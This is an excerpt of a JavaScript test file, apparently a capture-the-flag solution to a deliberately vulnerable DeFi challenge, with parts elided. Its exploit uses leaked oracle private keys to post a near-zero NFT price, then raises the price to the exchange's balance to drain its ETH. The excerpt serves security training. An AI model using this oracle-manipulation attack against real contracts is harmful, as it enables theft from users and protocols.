...
describe('Compromised challenge', function () {
    ...
    it('Exploit', async function () {
        ...
        /** The data given turn out to be the private keys of the two oracles. We use this to 
            manipulate the price to 0 before buying the NFT and manipulate it to be higher before selling
            to drain all the ETH.
        */

        // function to get the private keys 
        ...
        //import the oracles
        const orc1Trust = this.oracle.connect(compromisedOracles[0]);
        const orc2Trust = this.oracle.connect(compromisedOracles[1]);

        // change price to 0.01
        await orc1Trust.postPrice("DVNFT", ethers.utils.parseEther('0.01'))
        await orc2Trust.postPrice("DVNFT", ethers.utils.parseEther('0.01'))
        ...
        // Set the price to the current balance of the exchange
        await orc1Trust.postPrice("DVNFT", price)
        await orc2Trust.postPrice("DVNFT", price)
